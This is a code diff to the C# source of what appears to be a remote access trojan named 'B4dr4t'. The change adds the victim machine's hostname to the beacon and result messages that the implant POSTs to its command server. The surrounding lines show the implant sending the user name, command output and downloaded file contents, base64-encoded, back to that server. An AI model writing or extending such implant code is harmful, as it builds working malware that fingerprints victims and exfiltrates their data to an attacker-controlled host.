@@ -5,6 +5,7 @@ using System.Threading;
 using System.Reflection;
 using System.IO;
 using System.Security.Principal;
+using System.Net;
 using System.Net.Http;
 using Newtonsoft.Json.Linq;
 using System.Collections.ObjectModel;
@@ -24,6 +25,7 @@ namespace B4dr4t
     {
         readonly static string id = new Random().Next().ToString();
         readonly static string un = WindowsIdentity.GetCurrent().Name.Split('\\')[1];
+        readonly static string hn = Dns.GetHostName();
         readonly static string type = "c#";
         readonly static int sleepytime = 3000;
 
@@ -309,7 +311,7 @@ namespace B4dr4t
             {
                 try
                 {
-                    string resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\"}";
+                    string resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"}";
                     HttpResponseMessage postResults = client.PostAsync(home, new StringContent(resp)).Result;
 
                     string serverMsg = postResults.Content.ReadAsStringAsync().Result;
@@ -428,7 +430,7 @@ namespace B4dr4t
                         // Should just replace with a function that returns a base64 encoded string based off of typeof() but whatever
                         if (rettype == "dl")
                         {
-                            resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(retdata) + "\"}";
+                            resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(retdata) + "\"}";
                         }
                         else
                         {
@@ -436,7 +438,7 @@ namespace B4dr4t
                             {
                                 retval = "[*] No output returned";
                             }
-                            resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(retval)) + "\"}";
+                            resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(retval)) + "\"}";
                         }
                         retval = string.Empty;
                         postResults = client.PostAsync(home, new StringContent(resp)).Result;
